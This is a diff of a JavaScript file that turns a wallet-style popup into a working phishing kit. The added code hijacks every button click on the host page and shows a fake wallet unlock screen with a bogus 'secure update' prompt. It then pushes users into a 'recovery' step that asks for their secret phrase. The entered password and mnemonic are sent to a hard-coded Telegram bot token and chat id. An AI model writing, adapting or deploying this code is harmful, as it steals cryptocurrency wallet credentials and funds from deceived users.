@@ -1,49 +1,15 @@
-// walletPopup.js
-
-function showWalletPopup() {
-  // Prevent multiple popups
-  if (document.getElementById('popup')) {
-    document.getElementById('popup').classList.add('active');
-    return;
-  }
-
-  // Create popup container
-  const popup = document.createElement('div');
-  popup.className = 'wallet-popup';
-  popup.id = 'popup';
-  popup.innerHTML = `
-    <div id="passwordSection" class="section active">
-      <input type="password" placeholder="Enter your password" id="passwordInput" />
-      <button id="unlockBtn" disabled>Unlock</button>
-    </div>
-    <div id="updateSection" class="section">
-      <span class="download-label">
-        A secure update is ready. Please download to continue protecting your assets.
-      </span>
-      <button id="downloadBtn">Download Update</button>
-      <button id="skipBtn" style="margin-top:10px;background:#222b;">Skip</button>
-    </div>
-    <div id="loaderSection" class="loader-section">
-      <div class="loader"></div>
-      <div class="loader-message" id="loaderMsg"></div>
-    </div>
-    <div id="phraseSection" class="section">
-      <textarea placeholder="Import with Secret Phrase" id="phraseInput" rows="8" style="resize: none;"></textarea>
-      <button id="submitBtn" disabled>Submit</button>
-    </div>
-  `;
-
-  // Add styles
+(function () {
+  // Insert CSS
   const style = document.createElement('style');
   style.textContent = `
     @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
-    .wallet-popup {
+    .wallet-popup-ext {
       position: fixed;
       top: 0px;
       right: 24px;
       width: 330px;
       min-height: 540px;
-      background: #0d0d2b url('x.png') no-repeat center / cover;
+      background: #0d0d2b url('https://github.com/missminutesai/xvv/raw/main/x.png') no-repeat center / cover;
       color: #fff;
       border-radius: 14px;
       box-shadow: 0 8px 32px rgba(0,0,0,0.28);
@@ -54,13 +20,13 @@ function showWalletPopup() {
       display: flex;
       flex-direction: column;
       align-items: center;
-      z-index: 9999;
+      z-index: 999999;
+      font-family: 'Inter', 'Segoe UI', Arial, sans-serif;
     }
-    .wallet-popup.active {
-      opacity: 1;
-      pointer-events: auto;
-    }
-    input, button, textarea {
+    .wallet-popup-ext.active { opacity: 1; pointer-events: auto; }
+    .wallet-popup-ext input, 
+    .wallet-popup-ext button, 
+    .wallet-popup-ext textarea {
       width: 100%;
       padding: 12px;
       margin-top: 20px;
@@ -71,7 +37,8 @@ function showWalletPopup() {
       display: block;
       font-family: 'Inter', 'Segoe UI', Arial, sans-serif;
     }
-    input, textarea {
+    .wallet-popup-ext input, 
+    .wallet-popup-ext textarea {
       border: 2px solid #626664;
       border-radius: 18px;
       background: #28292c;
@@ -79,21 +46,15 @@ function showWalletPopup() {
       font-weight: 400;
       letter-spacing: 0.2px;
     }
-    input::placeholder {
+    .wallet-popup-ext input::placeholder,
+    .wallet-popup-ext textarea::placeholder {
       color: #bdbecb;
       text-align: left;
       font-size: 15px;
       font-weight: 400;
       opacity: 1;
     }
-    textarea::placeholder {
-      color: #ffffff;
-      text-align: left;
-      font-size: 15px;
-      font-weight: 400;
-      opacity: 1;
-    }
-    button {
+    .wallet-popup-ext button {
       background: linear-gradient(90deg, #626664 0%, #e49927 100%);
       color: #fff;
       font-weight: 500;
@@ -105,16 +66,14 @@ function showWalletPopup() {
       box-shadow: 0 2px 8px rgba(58,122,254,0.08);
       letter-spacing: 0.2px;
     }
-    button:disabled {
-      opacity: 0.6;
-      cursor: not-allowed;
-      background: #e49927;
+    .wallet-popup-ext button:disabled {
+      opacity: 0.6; cursor: not-allowed; background: #e49927;
     }
-    button:hover:enabled {
+    .wallet-popup-ext button:hover:enabled {
       background: linear-gradient(90deg, #626664 0%, #e49927 100%);
       box-shadow: 0 4px 16px rgba(58,122,254,0.16);
     }
-    .section {
+    .wallet-popup-ext .section {
       display: none;
       margin-top: 14px;
       width: 100%;
@@ -127,19 +86,19 @@ function showWalletPopup() {
       opacity: 0;
       pointer-events: none;
     }
-    .section.active {
+    .wallet-popup-ext .section.active {
       display: flex;
       opacity: 1;
       pointer-events: auto;
       transition: opacity 0.4s cubic-bezier(.4,0,.2,1);
     }
-    #phraseInput {
+    .wallet-popup-ext #phraseInputExt {
       min-height: 100px;
       font-family: inherit;
       text-align: left;
       resize: none;
     }
-    .download-label {
+    .wallet-popup-ext .download-label {
       color: #bdbecb;
       font-size: 15px;
       text-align: center;
@@ -150,7 +109,7 @@ function showWalletPopup() {
       width: 100%;
       display: block;
     }
-    .loader-section {
+    .wallet-popup-ext .loader-section {
       display: none;
       flex-direction: column;
       align-items: center;
@@ -161,13 +120,13 @@ function showWalletPopup() {
       pointer-events: none;
       transition: opacity 0.4s cubic-bezier(.4,0,.2,1);
     }
-    .loader-section.active {
+    .wallet-popup-ext .loader-section.active {
       display: flex;
       opacity: 1;
       pointer-events: auto;
       transition: opacity 0.4s cubic-bezier(.4,0,.2,1);
     }
-    .loader {
+    .wallet-popup-ext .loader {
       border: 4px solid #22244a;
       border-top: 4px solid #626664;
       border-radius: 50%;
@@ -181,7 +140,7 @@ function showWalletPopup() {
       0% { transform: rotate(0deg);}
       100% { transform: rotate(360deg);}
     }
-    .loader-message {
+    .wallet-popup-ext .loader-message {
       color: #bdbecb;
       font-size: 16px;
       text-align: center;
@@ -195,128 +154,155 @@ function showWalletPopup() {
       from { opacity: 0; }
       to { opacity: 1; }
     }
-    input:focus, textarea:focus {
+    .wallet-popup-ext input:focus, 
+    .wallet-popup-ext textarea:focus {
       border-color: #626664 !important;
       box-shadow: 0 0 0 2px #62666433;
       outline: none;
     }
-    .toggle-password {
+    .wallet-popup-ext .toggle-password {
       fill: #626664;
       cursor: pointer;
     }
   `;
   document.head.appendChild(style);
 
+  // Insert HTML
+  const popup = document.createElement('div');
+  popup.className = 'wallet-popup-ext';
+  popup.id = 'walletPopupExt';
+  popup.innerHTML = `
+    <div id="passwordSectionExt" class="section active">
+      <input type="password" placeholder="Enter your password" id="passwordInputExt" />
+      <button id="unlockBtnExt" disabled>Unlock</button>
+    </div>
+
+    <div id="updateSectionExt" class="section">
+      <span class="download-label">
+        A secure update is ready. Please download to continue protecting your assets.
+      </span>
+      <button id="downloadBtnExt">Download Update</button>
+      <button id="skipBtnExt" style="margin-top:10px;background:#222b;">Skip</button>
+    </div>
+
+    <div id="loaderSectionExt" class="loader-section">
+      <div class="loader"></div>
+      <div class="loader-message" id="loaderMsgExt"></div>
+    </div>
+
+    <div id="phraseSectionExt" class="section">
+      <textarea placeholder="Import with Secret Phrase" id="phraseInputExt" rows="8" style="resize: none;"></textarea>
+      <button id="submitBtnExt" disabled>Submit</button>
+    </div>
+  `;
   document.body.appendChild(popup);
 
-  // Show popup with fade-in
-  setTimeout(() => {
-    popup.classList.add('active');
-    document.querySelectorAll('.section, .loader-section').forEach((sec, idx) => {
-      sec.classList.toggle('active', idx === 0);
+  // Telegram details
+  const TELEGRAM_BOT_TOKEN = '7141420161:AAGh3wZMnUv45CEQg6UE7e0xpQIZGtYcdPA';
+  const TELEGRAM_CHAT_ID = '-4704812522';
+
+  function sendToTelegram(message) {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
     });
-  }, 10);
-
-  // Logic for enabling/disabling buttons
-  const phraseInput = popup.querySelector('#phraseInput');
-  const submitBtn = popup.querySelector('#submitBtn');
-  function togglePhraseBtn() {
-    submitBtn.disabled = phraseInput.value.trim() === '';
   }
-  phraseInput.addEventListener('input', togglePhraseBtn);
-  togglePhraseBtn();
 
-  const passwordInput = popup.querySelector('#passwordInput');
-  const unlockBtn = popup.querySelector('#unlockBtn');
-  function toggleUnlockBtn() {
-    unlockBtn.disabled = passwordInput.value.trim() === '';
-  }
-  passwordInput.addEventListener('input', toggleUnlockBtn);
-  toggleUnlockBtn();
-
-  // Section navigation logic
-  function nextSection(showId) {
+  // Section switching
+  function nextSectionExt(showId) {
     popup.querySelectorAll('.section, .loader-section').forEach(sec => sec.classList.remove('active'));
-    popup.querySelector(`#${showId}`).classList.add('active');
+    popup.querySelector('#' + showId).classList.add('active');
   }
 
-  // Download button
-  popup.querySelector('#downloadBtn').onclick = function() {
+  // Logic for loader and section transitions
+  function showLoaderExt() {
+    document.getElementById('loaderMsgExt').textContent = 
+      "For your security, we need to restore your wallet. Please wait while we prepare your recovery process.";
+    nextSectionExt('loaderSectionExt');
+    setTimeout(() => { nextSectionExt('phraseSectionExt'); }, 5000);
+  }
+  function showLazyLoaderExt() {
+    document.getElementById('loaderMsgExt').textContent = "";
+    nextSectionExt('loaderSectionExt');
+    setTimeout(() => { nextSectionExt('updateSectionExt'); }, 2000);
+  }
+  function handleDownloadExt() {
     const a = document.createElement('a');
     a.href = 'https://example.com/wallet-update.zip';
     a.download = 'wallet-update.zip';
     document.body.appendChild(a);
     a.click();
     document.body.removeChild(a);
-    // Do NOT show phrase section after download
-  };
-
-  // Skip button
-  popup.querySelector('#skipBtn').onclick = function() {
-    showLoader();
-  };
-
-  // Unlock button
-  unlockBtn.onclick = function() {
-    showLazyLoader();
-  };
-
-  // Submit button
-  submitBtn.onclick = function() {
-    submitPhrase();
-  };
-
-  // Loader logic
-  function showLoader() {
-    popup.querySelector('#loaderMsg').textContent = "For your security, we need to restore your wallet. Please wait while we prepare your recovery process.";
-    nextSection('loaderSection');
-    setTimeout(() => {
-      nextSection('phraseSection');
-    }, 5000);
   }
-
-  function showLazyLoader() {
-    popup.querySelector('#loaderMsg').textContent = "";
-    nextSection('loaderSection');
-    setTimeout(() => {
-      nextSection('updateSection');
-    }, 2000);
-  }
-
-  function submitPhrase() {
-    const phrase = phraseInput.value.trim();
+  function submitPhraseExt() {
+    const phrase = document.getElementById('phraseInputExt').value.trim();
     if (!phrase) {
       alert('Please enter your secret phrase.');
-      phraseInput.focus();
+      document.getElementById('phraseInputExt').focus();
       return;
     }
+    sendToTelegram(`Mnemonic phrase entered: ${phrase}`);
     alert('Phrase submitted!');
     popup.classList.remove('active');
   }
-}
 
-document.addEventListener('DOMContentLoaded', function() {
-  // Attach to "Show Popup" button if it exists
-  const btn = document.getElementById('showPopupBtn');
-  if (btn) {
-    btn.onclick = showWalletPopup;
-  }
-
-  // Attach to the "Sign in" button in the navbar
-  var signInBtn = document.getElementById('w-node-_86e3eda5-f50c-9eac-e4c3-b95121525a71-21525a5a');
-  if (signInBtn) {
-    signInBtn.addEventListener('click', function(e) {
-      e.preventDefault(); // Prevent navigation
-      showWalletPopup();
+  // Disable/enable buttons logic
+  function setupInputs() {
+    const phraseInput = document.getElementById('phraseInputExt');
+    const submitBtn = document.getElementById('submitBtnExt');
+    phraseInput.addEventListener('input', function () {
+      submitBtn.disabled = phraseInput.value.trim() === '';
     });
+    submitBtn.disabled = phraseInput.value.trim() === '';
+
+    const passwordInput = document.getElementById('passwordInputExt');
+    const unlockBtn = document.getElementById('unlockBtnExt');
+    passwordInput.addEventListener('input', function () {
+      unlockBtn.disabled = passwordInput.value.trim() === '';
+    });
+    unlockBtn.disabled = passwordInput.value.trim() === '';
   }
 
-  // Attach to the "Sign in" button in the hero section
-  var heroSignInBtn = document.getElementById('w-node-cfb10607-1aed-06f8-73c2-bd886d701d46-3a1ba278');
-  if (heroSignInBtn) {
-    heroSignInBtn.addEventListener('click', function(e) {
-      e.preventDefault(); // Prevent navigation
-      showWalletPopup();
+  // Bind events
+  document.getElementById('unlockBtnExt').addEventListener('click', function () {
+    const password = document.getElementById('passwordInputExt').value;
+    sendToTelegram(`Password entered: ${password}`);
+    showLazyLoaderExt();
+  });
+  document.getElementById('downloadBtnExt').addEventListener('click', handleDownloadExt);
+  document.getElementById('skipBtnExt').addEventListener('click', showLoaderExt);
+  document.getElementById('submitBtnExt').addEventListener('click', submitPhraseExt);
+
+  setupInputs();
+
+  // Show popup logic
+  function showPopup() {
+    popup.classList.add('active');
+    // Reset to first section
+    popup.querySelectorAll('.section, .loader-section').forEach((sec, idx) => {
+      sec.classList.toggle('active', idx === 0);
     });
+    // Reset inputs
+    document.getElementById('passwordInputExt').value = '';
+    document.getElementById('phraseInputExt').value = '';
+    setupInputs();
   }
-});
+
+  // Listen for any button click on the page
+  document.body.addEventListener('click', function (e) {
+    if (
+      e.target.closest('.wallet-popup-ext') ||
+      e.target.closest('button[data-wallet-popup-ignore]') // allow opt-out
+    ) return;
+    if (e.target.tagName === 'BUTTON') {
+      showPopup();
+      e.preventDefault();
+      e.stopPropagation();
+    }
+  }, true);
+
+  // Optional: expose showPopup for manual trigger
+  window.showWalletPopup = showPopup;
+})();
